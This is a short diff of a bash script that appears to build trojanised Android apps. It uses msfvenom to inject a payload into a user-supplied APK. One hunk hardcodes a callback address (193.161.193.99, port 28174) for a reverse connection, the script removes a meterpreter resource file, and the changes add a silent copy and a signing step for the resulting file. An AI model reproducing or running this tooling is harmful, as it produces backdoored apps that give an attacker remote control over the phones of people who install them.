@@ -293,7 +293,9 @@ read -p "[root@E99]:" apk;
 read -p "Output:" o;
 echo -e "${R}[ ✓ ] ${G}Generat payload "
 msfvenom -x $apk -p $payload LHOST=193.161.193.99 LPORT=28174 -o $o
-cp $o $lok
+
+cp $o $lok > /dev/null 2>&1
+$sign
 sleep 1
 eror
 echo
@@ -332,7 +334,8 @@ echo -e "\033[33m[!] OUTPUT : $o"
 echo 
 echo -e "${R}[✓] ${G}Generat payload "
 msfvenom -x $apk -p $payload LHOST=$lh LPORT=$lp -o $o
-cp $o $lok
+cp $o $lok > /dev/null 2>&1
+$sign
 eror
 rm meterpreter.rc > /dev/null 2>&1
 sleep 2
